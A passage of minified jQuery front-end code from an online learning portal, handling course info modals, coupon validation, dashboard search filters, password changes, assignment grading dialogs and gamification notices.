tl-green-ok":r&&r[g].length&&"1"==r[g]?"icon-remove tl-red-text":o[g],s&&s[g].length&&""!=s[g]?v.append('<a class="none-decoration tl-course-info-unit" href="javascript:void(0);" '+s[g]+'><i class="'+y+' tl-course-info-icon tl-icon16 tl-gray-icon"></i></a>'+a[g]):v.append('<i class="'+y+' tl-course-info-icon tl-icon16 tl-gray-icon tl-cursor-default"></i>'+a[g]),$("#tl-course-info-modal-unit-list").append(v)}else(v=$("<li>")).append(a[g]),$("#tl-course-info-modal-unit-list").append(v);else $("#tl-course-info-modal-no-units").show(),$("#tl-course-info-modal-unit-list").html("");if(0!=l.length){for($("#tl-course-info-modal-rules").show(),$("#tl-course-info-modal-rules-list").html(""),g=0;g<l.length;g++)$("#tl-course-info-modal-rules-list").append('<li><i class="icon-flag tl-course-info-icon tl-icon16 tl-gray-icon tl-cursor-default"></i> '+l[g]+"</li>");null!=c&&$("#tl-course-info-modal-rules-list").append('<li><i class="icon-trophy tl-course-info-icon tl-icon16 tl-gray-icon tl-cursor-default"></i> '+c+"</li>")}else $("#tl-course-info-modal-rules").hide(),$("#tl-course-info-modal-rules-list").html("");if(0!=d.length)for($("#tl-course-info-modal-prerequisites").show(),$("#tl-course-info-modal-prerequisites-list").html(""),g=0;g<d.length;g++){if("string"==typeof d[g])$("#tl-course-info-modal-prerequisites-list").append('<li><i class="icon-circle tl-course-info-icon tl-icon8 tl-gray-icon tl-cursor-default"></i>'+d[g]+"</li>");else for(var b=0;b<d[g].length;b++)$("#tl-course-info-modal-prerequisites-list").append('<li><i class="icon-circle tl-course-info-icon tl-icon8 tl-gray-icon tl-cursor-default"></i>'+d[g][b].course_name+"</li>");g!=d.length-1&&"string"!=typeof d[g+1]?$("#tl-course-info-modal-prerequisites-list").append("<li> or </li>"):g!=d.length-1&&"string"==typeof d[g+1]&&$("#tl-course-info-modal-prerequisites-list").append("<li> - </li>")}else $("#tl-course-info-modal-prerequisites").hide(),$("#tl-course-info-modal-prerequisites-list").html("");$("#tl-course-info-modal").modal("show")}})})),void 0!==myportal.content.instructorDashboard&&1==myportal.content.instructorDashboard&&($('i[rel="popover"]').popover({trigger:"click",html:!0,template:'<div class="popover" id="tl-instructor-goto-popover"><div class="arrow"></div><div class="popover-inner"><h3 class="popover-title text-center"></h3><div class="popover-content"><p></p></div></div></div>',container:"body",placement:function(t,e){var i=$(e).offset(),a=$(document).outerHeight(),o=$(document).outerWidth(),n=.5*a-i.top>0?"bottom":"top";return o<900||i.left<92?"right":n}}),$("body").on("click",'i[rel="popover"]',(function(t){var e=$(this);e.addClass("tl-visible-popover"),e.data("popover").tip().hasClass("in")?(n&&n.popover("hide"),n&&n.css("visibility","hidden").removeClass("tl-visible-popover"),n=e):(n&&n.removeClass("tl-visible-popover"),n&&!n.hasClass("tl-instructor-goto-mobile")&&n.css("visibility","hidden"),n="")})),$(document).on("click",(function(t){var e=$(t.target);e.hasClass("tl-goto-link")&&$(location).attr("href",e.find("a:first").attr("href")),e.hasClass("tl-goto-actions")&&$(location).attr("href",e.next("a:first").attr("href")),"popover"!=e.attr("rel")&&(n&&n.popover("hide"),n&&n.removeClass("tl-visible-popover"),n&&!n.hasClass("tl-instructor-goto-mobile")&&n.css("visibility","hidden"),n="")}))),$(document).on("click","iframe #controlbar",(function(){return!1})),$("input:text[name='name']").blur((function(){t=!1,$(this).val()&&(t=!0)}))}}}(),$(document).ready((function(){myportal.form.init(),myportal.tree.init(),myportal.content.init()})),$(document).ready((function(){$(document).on("click",".secured_site_icon",(function(t){t.preventDefault(),$("#secured_site_modal").modal()}))})),$.fn.extend({insertAtCaret:function(t){if(jQBrowser.msie)$(this).focus(),sel=document.selection.createRange(),sel.text=t,$(this).focus();else if(jQBrowser.mozilla||jQBrowser.webkit){var e=$(this)[0].selectionStart,i=$(this)[0].selectionEnd,a=$(this).scrollTop;$(this).val($(this).val().substring(0,e)+t+$(this).val().substring(i,$(this).val().length)),$(this)[0].selectionStart=e+t.length,$(this)[0].selectionEnd=e+t.length,$(this).scrollTop=a,$(this).focus()}else $(this).val($(this).val()+t),$(this).focus()}}),Date.prototype.stdTimezoneOffset=function(){var t=new Date(this.getFullYear(),0,1),e=new Date(this.getFullYear(),6,1);return Math.max(t.getTimezoneOffset(),e.getTimezoneOffset())},Date.prototype.dst=function(){return this.getTimezoneOffset()<this.stdTimezoneOffset()},String.prototype.truncateCourseCodeLength=function(t,e){return this.length+e+5<=t?this:this.substring(0,t-5-e)+"..."},$(document).ready((function(){var t=$(".tl-form:first").attr("id");"tl-extended-timeline"!=t&&(navigator.userAgent.match(/(iPad|iPhone|iPod)/i)||("tl-gamification-engine-form"==t?setTimeout((function(){$("#each_login").focus()}),10):setTimeout((function(){$(".tl-form:first *:input[type!=hidden]:first:not(.select2-input)").focus()}),10))),$(".form-actions .btn-group .dropdown-menu").each((function(){var t=$(this).closest(".btn-group");t.offset().top+t.outerHeight()+$(this).outerHeight()>$(window).height()?t.addClass("dropup"):t.removeClass("dropup")})),$(".modal").on("shown",(function(){if(!navigator.userAgent.match(/(iPad|iPhone|iPod)/i)){var t=$(this).find(".tl-form:first").attr("id");setTimeout((function(){$("#"+t+" *:input[type!=hidden]:first").focus()}),50)}})),"tl-main-login-form"!=$(".tl-form:first").attr("id")&&$("input, textarea").placeholder(),$(document).on("focus",".tl-countdown textarea",(function(t){myportal.app.countdownTextareaFocusin($(this))})),$(document).on("focusout",".tl-countdown textarea",(function(t){myportal.app.countdownTextareaFocusout($(this))})),$(document).on("focus",".tl-countdown input",(function(t){myportal.app.countdownTextboxFocusin($(this))})),$(document).on("focusout",".tl-countdown input",(function(t){myportal.app.countdownTextboxFocusout($(this))})),$("#tl-cancel-export").on("click",(function(){if($(this).hasClass("disabled"))return!1;$(this).addClass("disabled"),$("#tl-export-to-csv-modal .modal-footer div:first").show()})),$("#tl-export-to-csv-modal").on("hidden",(function(){$("#tl-cancel-export").removeClass("disabled"),$("#tl-export-to-csv-modal .modal-footer div:first").hide()})),$(document).on("click","#tl-cancel-export-modal",(function(){if($(this).hasClass("disabled"))return!1;$(this).addClass("disabled"),$("#tl-loading-export-modal").hide()})),$(document).on("click",".tl-toggle-random-question",(function(){try{if($(this).hasClass("btn-success")&&2==myportal.content.toggledRandomQuestions)return myportal.app.notify({type:"error",message:$("#random-questions-nr-error").text()}),!1}catch(t){}var t=$(this).data("url");myportal.app.ajax(t,{context:$(this),type:"POST",data:{randomQuestionId:$(this).data("randomquestionid"),questionId:$(this).data("questionid"),type:$(this).data("type"),myToken:myToken},success:function(t){myportal.app.parseResponse(t).status?($(this).removeClass("btn-primary").addClass("active btn-success").text(myportal.app.translate("added")),myportal.content.toggledRandomQuestions++):($(this).removeClass("active btn-success").addClass("btn-primary").text(myportal.app.translate("add")),myportal.content.toggledRandomQuestions--)}})})),$(document).on("click",".filter-byqtype",(function(){if(myportal.content.typeFilterRandom=0==myportal.content.filteredRandom?$(this).data("type"):"",myportal.content.filteredRandom=0==myportal.content.filteredRandom,$("#tl-show-all-non-random-questions").hasClass("active"))var t=$(this).data("filterurlall").replace("##qtype##",myportal.content.typeFilterRandom);else t=$(this).data("filterurl").replace("##qtype##",myportal.content.typeFilterRandom);$("#tl-list-random-question-pool").DataTable().ajax.url(t).load()})),$(document).on("click","#tl-show-all-non-random-questions",(function(){var t=$("#tl-list-random-question-pool").DataTable();if($(this).hasClass("active")){e=$(this).data("filterurlall").replace("##qtype##",myportal.content.typeFilterRandom);t.column(3).visible(!0)}else{var e=$(this).data("filterurl").replace("##qtype##",myportal.content.typeFilterRandom);t.column(3).visible(!1)}t.ajax.url(e).load()})),$(document).on("submit","#add-coupon-form, #edit-coupon-form",(function(){var t=$(this).data("submiturl"),e=$(this).attr("id");return myportal.app.ajax(t,{type:"POST",data:$(this).serialize(),dataType:"json",success:function(t){t.success&&($("#tl-add-edit-coupon-modal").modal("hide"),$("#tl-list-coupons").DataTable().draw("add-coupon-form"==e))}}),!1})),$(document).on("click","#tl-switch-to-fixed-amount-discount",(function(){$("#tl-percentage-discount-group").hide(),$("#tl-discount-currency-group, #tl-fixed-amount-discount-group").show(),$("#tl-discount-type").val($(this).data("newtype"))})),$(document).on("click","#tl-switch-to-percentage-discount",(function(){$("#tl-discount-currency-group, #tl-fixed-amount-discount-group").hide(),$("#tl-percentage-discount-group").show(),$("#tl-discount-type").val($(this).data("newtype"))})),$(document).on("change","#tl-discount-currency",(function(){myportal.app.ajax($(this).data("ajaxurl"),{type:"POST",data:{currency:$(this).val()},success:function(t){(t=$.parseJSON(t)).success&&$("#tl-discount-currency-symbol").html(t.data.currencySymbol)}})}));var e=function(t){t?$("#payvia-credits-coupon-help-block").html(""):$("#payments-coupon-help-block").html(""),t?$("#payvia-credits-coupon-group").removeClass("error"):$("#payments-coupon-group").removeClass("error")};$("#payments-got-coupon").on("click",(function(){$("#payments-coupon-group").slideToggle("400"),setTimeout((function(){$("#coupon").focus()}),10)})),$("#payvia-credits-got-coupon").on("click",(function(){$("#payvia-credits-coupon-group").slideToggle("400"),setTimeout((function(){$("#payvia-credits-coupon").focus()}),10)}));var i=function(){$("#subscription-coupon-help-block").html(""),$("#subscription-coupon-group").removeClass("error")};if($("#subscription-got-coupon").on("click",(function(){$("#subscription-coupon-group").slideToggle("400"),setTimeout((function(){$("#coupon").focus()}),10)})),$("#validate-payments-coupon-button, #payvia-credits-validate-coupon").on("click",(function(){if($(this).hasClass("disabled"))return!1;var t="validate-payments-coupon-button"!=$(this).attr("id"),i={coupon:t?$("#payvia-credits-coupon").val():$("#coupon").val(),price:t?$("#payvia-credits-form-raw-price").text():$("#payment-form-raw-price").text()};e(t),$(this).addClass("disabled").text(myportal.app.translate("processing")),""!=$(this).data("courseid")?i["course-id"]=$(this).data("courseid"):""!=$(this).data("groupid")?i["group-id"]=$(this).data("groupid"):""!=$(this).data("categoryid")&&(i["category-id"]=$(this).data("categoryid")),myportal.app.ajax($(this).data("url"),{type:"POST",data:i,success:function(i){if($.parseJSON(i).success){var a=$.parseJSON(i).data;a.valid?e(t):t?$("#payvia-credits-coupon-group").addClass("error"):$("#payments-coupon-group").addClass("error"),t?$("#payvia-credits-coupon-help-block").html("<span class='help-inline'>"+a.message+"</span>"):$("#payments-coupon-help-block").html("<span class='help-inline'>"+a.message+"</span>"),t?($("#tl-payvia-credits-original-price").hasClass("tl-initial-price")?$("#tl-payvia-credits-discount-price").html(decodeURIComponent(a.newPrice)):$("#tl-payvia-credits-original-price").html(decodeURIComponent(a.newPrice)),$("#tl-payvia-credits-credits-price").html(decodeURIComponent(a.creditsPrice))):$("#tl-original-price").hasClass("tl-initial-price")?$("#tl-discount-price").html(decodeURIComponent(a.newPrice)):$("#tl-original-price").html(decodeURIComponent(a.newPrice))}t?$("#payvia-credits-validate-coupon").removeClass("disabled").text(myportal.app.translate("validate")):$("#validate-payments-coupon-button").removeClass("disabled").text(myportal.app.translate("validate"))}})})),$("#validate-subscription-coupon-button").on("click",(function(){if($(this).hasClass("disabled"))return!1;i(),$(this).addClass("disabled").text(myportal.app.translate("processing")),myportal.app.ajax($(this).data("url"),{type:"POST",data:{coupon:$("#coupon").val(),price:$("#subscription-form-raw-price").text(),subscription:"1"},success:function(t){if($.parseJSON(t).success){var e=$.parseJSON(t).data;e.valid?i():$("#subscription-coupon-group").addClass("error"),$("#subscription-coupon-help-block").html("<span class='help-inline'>"+e.message+"</span>"),$("#subscription-form-price span:first").html(decodeURIComponent(e.newPrice))}$("#validate-subscription-coupon-button").removeClass("disabled").text(myportal.app.translate("validate"))}})})),$(document).on("click",".tl-rename-file-icon",(function(){var t=$(this).data("fileid");myportal.app.ajax($(this).data("url"),{type:"POST",data:{renameFileId:t,myToken:myToken},success:function(t){(t=$.parseJSON(t)).success&&($("#tl-rename-file-modal .modal-body").empty().html(t.data.html),$("#tl-rename-file-modal").modal())}})})),$(document).on("submit","#tl-rename-file-form",(function(){return myportal.app.ajax($(this).data("submiturl"),{type:"POST",data:$(this).serialize()+"&myToken="+myToken,dataType:"json",success:function(t){t.success&&($("#tl-rename-file-modal").modal("hide"),$("#tl-files-grid").DataTable().draw(!1))}}),!1})),$(document).on("click","#tl-hide-rename-file-modal",(function(){$("#tl-rename-file-modal").modal("hide")})),$(document).on("submit","#add-language-override-form",(function(){var t=$(this).data("submiturl");return myportal.app.ajax(t,{type:"POST",data:$(this).serialize(),dataType:"json",success:function(t){t.success&&($("#tl-add-language-override-form-wrapper").fadeOut("400","swing",(function(){t.data.showAdd?$("#tl-add-language-override-wrapper, #tl-language-overrides-grid").fadeIn("400"):($("#tl-language-overrides-grid").fadeIn("400"),$("#tl-add-language-override-wrapper").addClass("invisible-add-language-override"))})),$("#tl-list-language-overrides").DataTable().draw())}}),!1})),$(document).on("submit","#edit-language-override-form",(function(){var t=$(this).data("submiturl");return myportal.app.ajax(t,{type:"POST",data:$(this).serialize(),dataType:"json",success:function(t){t.success&&($("#tl-edit-language-override-form-wrapper").fadeOut("400","swing",(function(){$("#tl-add-language-override-wrapper").hasClass("invisible-add-language-override")?$("#tl-language-overrides-grid").fadeIn("400"):$("#tl-add-language-override-wrapper, #tl-language-overrides-grid").fadeIn("400")})),$("#tl-list-language-overrides").DataTable().draw(!1))}}),!1})),$(document).on("submit","#delete-language-override-form",(function(){var t=$(this).data("submiturl");return myportal.app.ajax(t,{type:"POST",data:$(this).serialize(),dataType:"json",success:function(t){t.success&&($("#tl-delete-language-override-form-wrapper").fadeOut("400","swing",(function(){$("#tl-add-language-override-wrapper, #tl-language-overrides-grid").fadeIn("400")})),$("#tl-list-language-overrides").DataTable().draw(!1))}}),!1})),showSelect2)try{$(".tl-select2").select2({width:"element",minimumResultsForSearch:10,dropdownAutoWidth:!0})}catch(t){}var a="";$(document).on("click",".tl-grid-mode-filter",(function(){var t=$(this).data("filter"),e={},i=0,o=0,n="";if($(".tl-tree-category").data("forceVisibility",0),t==a)$(".tl-grid-dashboard-course-wrapper").show(),a="",$(".tl-grid-dashboard-course-wrapper").each((function(){$(this).next().hasClass("clear")&&$(this).next().remove()})),$(".tl-grid-dashboard-course-wrapper").each((function(){$(this).data("coursesset")in e||(e[$(this).data("coursesset")]=$('.tl-grid-dashboard-course-wrapper[data-coursesset="'+$(this).data("coursesset")+'"]').length),n!=$(this).data("coursesset")&&(n=$(this).data("coursesset"),o=0),i++,o++,i%3!=0&&o!=e[$(this).data("coursesset")]||($("<div class='clear'></div>").insertAfter($(this)),i=0)})),$("input.search-query").val(""),setTlmsCookie("cookie_dashboard_search","",{expires:null,path:"/",domain:myEffectiveDomain,secure:!1});else{var r=$.cookie("cookie_dashboard_search")?decodeURIComponent($.cookie("cookie_dashboard_search")).replace(/[&\/\\#,+()$~%.'":;*?<>{}@\^=\[\]\|]+/g,""):"";$(".tl-grid-dashboard-course-wrapper").each((function(){var i=$(this),a=i.find(".coursename:first").find(".tl-formatted-course-name").attr("title");i.data("coursesset")in e||(e[i.data("coursesset")]=0),!i.find(".coursestatus:first").find("span").hasClass("label-"+t)||""!=r&&a.toLowerCase().indexOf(r.toLowerCase())<0?i.hide():e[i.data("coursesset")]++,i.next().hasClass("clear")&&i.next().remove()})),""!=r&&$(".tl-tree-category").each((function(){$(this).find(".tl-tree-category-title").text().toLowerCase().indexOf(r.toLowerCase())<0?$(this).hide():($(this).data("forceVisibility",1).show(),$(this).parents("ul").prev().data("forceVisibility",1).show())})),$(".tl-grid-dashboard-course-wrapper").each((function(){"none"!==$(this).css("display")&&(n!=$(this).data("coursesset")&&(n=$(this).data("coursesset"),o=0),i++,o++,i%3!=0&&o!=e[$(this).data("coursesset")]||($("<div class='clear'></div>").insertAfter($(this)),i=0))})),a=t}setTlmsCookie("cookie_dashboard_filter",a,{expires:null,path:"/",domain:myEffectiveDomain,secure:!1})})),$("#grid_course_catalog_filter #tl-tree-filter").on("keyup",(function(){0==$(".tl-tree-course:visible").length?$(".tl-search-empty-result").show():$(".tl-search-empty-result").hide()}));var o=!1,n=!0;function r(t,e,i,l,c,d,p,u,h){if(n)return o=!1,!1;if(t.slice(i*l,i*l+l).each((function(){var t=$(this),e=t.find(".coursename:first").find(".tl-formatted-course-name").attr("title"),i=!1;t.data("coursesset")in d||(d[t.data("coursesset")]=0),e.toLowerCase().indexOf(c.toLowerCase())<0||""!=a&&!t.find(".coursestatus:first").find("span").hasClass("label-"+a)?t.hide():(t.css("display","inline-block"),d[t.data("coursesset")]++,i=!0),t.next().hasClass("clear")&&t.next().remove(),i&&($(this).data("coursesset")in d||(d[$(this).data("coursesset")]=$('.tl-grid-dashboard-course-courseWrapper[data-coursesset="'+$(this).data("coursesset")+'"]').length),h!=$(this).data("coursesset")&&(h=$(this).data("coursesset"),u=0),p++,u++,p%3==0&&($("<div class='clear'></div>").insertAfter($(this)),p=0))})),(i+=1)<=e&&0!=e)setTimeout((function(){r(t,e,i,l,c,d,p,u,h)}),50);else{var f=$(".tl-tree-category"),m=Math.floor(f.length/l);setTimeout((function(){s(f,m,0,l,c,d)}),50)}}function s(t,e,i,a,r,l){if(n)return o=!1,!1;t.slice(i*a,i*a+a).each((function(){$(this).find(".tl-tree-category-title").text().toLowerCase().indexOf(r.toLowerCase())<0&&!l[$(this).data("id")]?$(this).hide():($(this).data("forceVisibility",1).css("display","inline-block"),$(this).parents("ul").prev().data("forceVisibility",1).css("display","inline-block"))})),(i+=1)<=e&&0!=e?setTimeout((function(){s(e,i,a,r)}),50):setTimeout((function(){c(l,r)}),50)}function l(t,e,i,o,n,r,s,d,p){t.slice(i*o,i*o+o).each((function(){$(this).next().hasClass("clear")&&$(this).next().remove(),$(this).data("coursesset")in r||(r[$(this).data("coursesset")]=$('.tl-grid-dashboard-course-wrapper[data-coursesset="'+$(this).data("coursesset")+'"]').length),p!=$(this).data("coursesset")&&(p=$(this).data("coursesset"),d=0),s++,d++,s%3!=0&&d!=r[$(this).data("coursesset")]||($("<div class='clear'></div>").insertAfter($(this)),s=0)})),(i+=1)<=e&&0!=e?setTimeout((function(){l(t,e,i,o,n,r,s,d,p)}),50):(a="",setTlmsCookie("cookie_dashboard_filter","",{expires:null,path:"/",domain:myEffectiveDomain,secure:!1}),$(".tl-microstats-section").length&&$(".tl-microstats-section .item").removeClass("active"),setTimeout((function(){c(r,n)}),50))}function c(t,e){var i=!0;for(var a in t)if(t[a]>0){i=!1;break}i&&$(".tl-search-empty-result").show(),setTlmsCookie("cookie_dashboard_search",encodeURIComponent(e),{expires:null,path:"/",domain:myEffectiveDomain,secure:!1}),o=!1}$("#tl-grid-mode-search").on("keyup",(function(){if(o)return n=!0,setTimeout((function(){$("#tl-grid-mode-search").trigger("keyup")}),50),!1;o=!0,n=!1;var t=$.trim($(this).val().replace(/[&\/\\#,+()$~%.'":;*?<>{}@\^=\[\]\|]+/g,"")),e={};$(".tl-tree-category").data("forceVisibility",0),$(".tl-search-empty-result:visible").length>0&&$(".tl-search-empty-result").hide();var i=$(".tl-grid-dashboard-course-wrapper"),a=Math.floor(i.length/500);""==t?($(".tl-grid-dashboard-course-wrapper").css("display","inline-block"),$(".tl-tree-category").css("display","inline-block"),l(i,a,0,500,t,e,0,0,"")):r(i,a,0,500,t,e,0,0,"")})),$("#tl-password-change-form").submit((function(){$("#tl-password-change-form .error").removeClass("error"),$("#tl-password-change-form .help-block").html(""),$("#tl-password-change-form .alert-error").remove();var t=$(this).serialize();return myportal.app.ajax($(this).data("url"),{type:"POST",data:t,dataType:"json",success:function(t){t.success?($("#tl-password-change-modal .modal-body").empty().html('<div class="alert alert-success fade in out">'+myportal.app.translate("operation-completed-successfully")+"</div>"),setTimeout((function(){$("#tl-password-change-modal").modal("hide")}),1500)):(t.data?$.each(t.data,(function(t,e){$("input[name='"+t+"']").parents(".control-group").addClass("error"),$("input[name='"+t+"']").closest(".controls").find(".help-block:first").html('<span class="help-inline">'+e+"</span>")})):t.exc&&$("#tl-password-change-modal .modal-body").prepend('<div class="alert alert-error fade in out"><a class="close" data-dismiss="alert" href="#">&times;</a><p>'+t.exc+"</p></div>"),$("#tl-password-change-form input[type=submit]").removeClass("disabled").removeAttr("disabled").val(myportal.app.translate("reset-password")))},error:function(t){var e=$.parseJSON(t.responseText);myportal.app.notify({type:"error",message:decodeURIComponent(e.message)})}}),!1})),$("#tl-assignment-status-grade-modal").on("show",(function(){$(".tl-assignment-status-grade-form .error").removeClass("error"),$("#tl-assignment-status-grade-modal .tl-grade-box").show(),$("#tl-assignment-status-grade-modal .tl-history-box").hide(),$(".help-block").html(""),$(".alert-error").remove(),$("#tl-assignment-status-grade-modal .tl-history-area").html("").hide(),$("#tl-assignment-status-grade-modal .tl-open-history-icon").show(),$("#tl-assignment-status-grade-modal .tl-close-history-icon").hide(),$(".tl-assignment-status-grade-form input[type=submit]").removeClass("disabled").removeAttr("disabled").val(myportal.app.translate("save"))})),$("#tl-assignment-status-grade-modal").on("hide",(function(t){if(($("#tl-assignment-reply-modal").data("modal")||{}).isShown)return $("#tl-assignment-reply-modal").removeClass("fade"),$("#tl-assignment-reply-modal").modal("hide"),$("#tl-assignment-reply-modal").addClass("fade"),t.preventDefault(),t.stopImmediatePropagation(),!1})),$("#tl-assignment-reply-modal").on("show",(function(){$(".tl-assignment-status-grade-form .error").removeClass("error"),$("#thegradeform").hide(),$("#tl-assignment-reply-modal .tl-history-box").hide(),$("#thereply").show(),$("#show-hide-grade-form").removeClass("active"),$(".help-block").html(""),$(".alert-error").remove(),$("#tl-assignment-reply-modal .tl-history-area").html("").hide(),$("#tl-assignment-reply-modal .tl-open-history-icon").show(),$("#tl-assignment-reply-modal .tl-close-history-icon").hide(),$(".tl-assignment-status-grade-form input[type=submit]").removeClass("disabled").removeAttr("disabled").val(myportal.app.translate("save"))})),$("#tl-assignment-reply-modal").on("hide",(function(){($("#tl-assignment-status-grade-modal").data("modal")||{}).isShown&&($(this).removeClass("fade"),setTimeout((function(){$("#tl-assignment-reply-modal").addClass("fade")}),50))})),$("#show-hide-grade-form").on("click",(function(){$(this).hasClass("active")?$("#thegradeform").fadeOut("slow"):($("#tl-assignment-reply-modal .tl-history-box").hide(),$("#thegradeform").fadeIn(300,(function(){setTimeout((function(){$("#thereply").show(),$("#tl-assignment-reply-modal").find(".modal-body").animate({scrollTop:0})}),100)})))})),showStatusGradeModal=function(t,e,i){e?($("#tl-assignment-status-grade-modal").modal(),$(".tl-assignment-modal-type").val("status-grade")):$(".tl-assignment-modal-type").val("reply"),i&&myportal.app.ajax(i,{dataType:"json",success:function(t){t.success&&(t.hasHistory?($(".tl-assignment-history").removeClass("hide"),$(".tl-history-area").html(t.data)):$(".tl-assignment-history").addClass("hide"))}},!1),$(".tl-assignment-grade").val(t.data("grade")),$(".tl-assignment-status").val(t.data("status")),$(".tl-assignment-status").select2("val",t.data("status")),$(".tl-assignment-comments").val(t.data("comments")),$(".unit-progress-id").val(t.data("progress")),e?$(".status-grade-comments-editor").code(t.data("comments")):$(".reply-comments-editor").code(t.data("comments"))},showReplyModal=function(t,e,i){t.hasClass("tl-check-history")?($("#show-hide-grade-form").hide(),$("#tl-close-history-submission").show()):($("#show-hide-grade-form").show(),$("#tl-close-history-submission").hide(),$("#tl-close-history-submission").attr("data-progress",t.attr("data-progress"))),myportal.app.ajax(t.data("url"),{type:"GET",success:function(a){var o=myportal.app.parseResponse(a);$("#tl-assignment-reply-modal .modal-body #thereply").html(o.reply),t.attr("data-historyurl")?showStatusGradeModal($("#set-assignment-reply-grade-"+t.data("progress")),!1,t.attr("data-historyurl")):showStatusGradeModal($("#set-assignment-reply-grade-"+t.data("progress")),!1,null),void 0!==typeof e&&!0===e?(void 0!==$("#tl-assignment-reply-modal").data("modal")&&($("#tl-assignment-reply-modal").data("modal").options.backdrop=!1),$("#tl-assignment-reply-modal").removeClass("fade"),$("#tl-assignment-reply-modal").modal({backdrop:!1}),$("#tl-assignment-reply-modal").addClass("fade")):(void 0!==$("#tl-assignment-reply-modal").data("modal")&&($("#tl-assignment-reply-modal").data("modal").options.backdrop=!0),$("#tl-assignment-reply-modal").addClass("fade"),$("#tl-assignment-reply-modal").modal({backdrop:!0})),void 0!==typeof i&&!0===i&&$("#thegradeform").show()}})};var d=$.cookie("gamification_points_for_login"),p=$.cookie("gamification_activity_badge");if(d){var u=d.split("###");if("points"==$("#tl-header-gamification-entrance").data("entrancemode"))$("#tl-header-gamification-entrance").empty(),new countUp("tl-header-gamification-entrance",parseInt($("#tl-header-gamification-entrance").data("entrancevalue"))-parseInt(u[1]),parseInt($("#tl-header-gamification-entrance").data("entrancevalue")),0,1.5,{useEasing:!0,useGrouping:!0,separator:"",suffix:" "+myportal.app.translate("points")}).start();$("#tl-gamification-points-message").html(decodeURIComponent(u[0])).fadeIn(1e3),setTlmsCookie("gamification_points_for_login",null,{expires:-1,path:"/",domain:myEffectiveDomain,secure:!1}),setTimeout((function(){$("#tl-gamification-points-message").fadeOut("slow")}),3e3)}if(p){u=p.split("###");if(d&&$("#tl-gamification-badges-message").css("bottom",$("#tl-gamification-points-message").height()+20+16+5),"badges"==$("#tl-header-gamification-entrance").data("entrancemode"))$("#tl-header-gamification-entrance").empty(),new countUp("tl-header-gamification-entrance",0,parseInt($("#tl-header-gamification-entrance").data("entrancevalue")),0,1.5,{useEasing:!0,useGrouping:!0,separator:"",suffix:" "+myportal.app.translate("badges")}).start();$(".tl-badge-image").attr("src",u[1]),$(".tl-badge-message").html(decodeURIComponent(u[0])),$("#tl-gamification-badges-message").fadeIn(1e3).css("display","table"),setTlmsCookie("gamification_activity_badge",null,{expires:-1,path:"/",domain:myEffectiveDomain,secure:!1}),setTimeout((function(){$("#tl-gamification-badges-message").fadeOut("slow")}),5e3)}$(document).on("click",".tl-external-autologin-to-branch",(function(){myportal.app.ajax($(this).data("url"),{success:function(t){t=$.parseJSON(t);$(location).attr("href",t.data.url)}})})),$(document).on("submit","#tl-relogin-form",(function(){var t=$(this).data("submiturl"),e=$(this).serialize();return $("#tl-relogin-form .error").removeClass("error"),$("#tl-relogin-form .help-block").html(""),$(".toast-error").hide(),myportal.app.ajax(t,{type:"POST",data:e,dataType:"json",success:function(t){t.success?$(location).attr("href",reloginRedirectUrl):(t.data?$.each(t.data,(function(t,e){$("input[name='"+t+"']").parents(".control-group").addClass("error"),$("input[name='"+t+"']").closest(".controls").find(".help-block:first").html('<span class="help-inline">'+e+"</span>")})):t.exception&&myportal.app.notify({type:"error",message:t.exception}),$("#tl-relogin-form input[type=submit]").removeClass("disabled").removeAttr("disabled").val(myportal.app.translations.login))}},!0),!1}))})),jQuery.fn.triggerEvent=function(t,e){var i=this[0];document.createEvent?((e=document.createEvent("MouseEvents")).initMouseEvent(t,!0,!0,i.ownerDocument.defaultView,0,0,0,0,0,!1,!1,!1,!1,0,null),i.dispatchEvent(e)):i.fireEvent&&i.fireEvent("on"+t)},$(document).ready((function(){$("#preview_modal").bind("hide",(function(){"object"==typeof previewPlayer&&(previewPlayer.destroy(),$("#preview_modal").empty(),previewPlayer=void 0)}))})),$(document).ready((function(){makeIframesElastic(),$(window).resize((function(){myportal.isIE()||makeIframesElastic()}))}));var helpVideoItemTemplate=null;function getHelpVideoItemTemplate(){if(helpVideoItemTemplate)return helpVideoItemTemplate.clone();var t=$("#help-videos-list [data-video-list-item-template]");return t.length?(helpVideoItemTemplate=t.clone().removeClass("hidden"),t.remove()):helpVideoItemTemplate=null,helpVideoItemTemplate?helpVideoItemTemplate.clone():null}function createHelpVideoItem(t,e,i){var a=getHelpVideoItemTemplate();return a&&(a.find("[data-param-img]").css("background-image","url("+t+")"),a.find("[data-param-title]").text(e).attr("title",e),a.find(".tl-help-videos_video-item").attr("data-title",e),a.find(".tl-help-videos_video-item").attr("data-url",i)),a}function getHelpVideos(t){if(!hasAttribute("#tl-search-help-videos","data-url"))return!1;var e=$("#tl-search-help-videos").attr("data-url").replace("##TERM##",t||"0");$("#help-videos-loading-msg").show(),$("#help-videos-list").hide(),$("#help-videos-empty-msg").hide(),myportal.app.ajax(e,{async:!0,dataType:"json",success:function(t){if(t.success){var e=t.videos;if(e.length){for(var i=[],a=0;a<e.length;a++)i.push(createHelpVideoItem(e[a].thumbnail,e[a].title,e[a].url));$("#help-videos-list").html("").append(i),$("#help-videos-loading-msg").hide(),$("#help-videos-list").show(),$("#help-videos-empty-msg").hide()}else $("#help-videos-list").html(""),$("#help-videos-loading-msg").hide(),$("#help-videos-list").hide(),$("#help-videos-empty-msg").show()}else $("#help-videos-loading-msg").hide(),$("#help-videos-list").hide(),$("#help-videos-empty-msg").show()},error:function(){$("#help-videos-loading-msg").hide(),$("#help-videos-list").hide(),$("#help-videos-empty-msg").show()}})}function openHelpVideo(t,e){$("#tl-help-video-modal").empty().append('<div class="modal-header"><a class="close" data-dismiss="modal">&times;</a><h3 class="tl-modal-header">'+t+'</h3></div><div class="modal-body tl-help-videos_modal-body"><div class="tl-help-videos_modal-body_iframe-container"><iframe src="'+e+'"></iframe></div></div>'),$("#tl-help-video-modal").modal()}function strip_tags(t,e){if(!t)return t;e=(((e||"")+"").toLowerCase().match(/<[a-z][a-z0-9]*>/g)||[]).join("");return t.replace(/<!--[\s\S]*?-->|<\?(?:php)?[\s\S]*?\?>/gi,"").replace(/<\/?([a-z][a-z0-9]*)\b[^>]*>/gi,(function(t,i){return e.indexOf("<"+i.toLowerCase()+">")>-1?t:""}))}function htmlspecialchars_decode(t,e){var i=0,a=0,o=!1;void 0===e&&(e=2),t=t.toString().replace(/&lt;/g,"<").replace(/&gt;/g,">");var 